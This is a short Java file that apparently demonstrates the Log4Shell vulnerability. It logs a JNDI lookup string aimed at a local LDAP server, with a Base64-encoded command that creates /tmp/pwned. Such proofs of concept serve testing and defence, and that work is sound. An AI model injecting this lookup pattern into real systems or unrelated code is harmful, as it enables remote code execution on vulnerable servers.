import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
  private static final Logger logger = LogManager.getLogger("HelloWorld");

  public static void main(String[] args) {
    logger.info(
        "Created /tmp/pwned file. ${jndi:ldap://localhost:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}");
  }
}
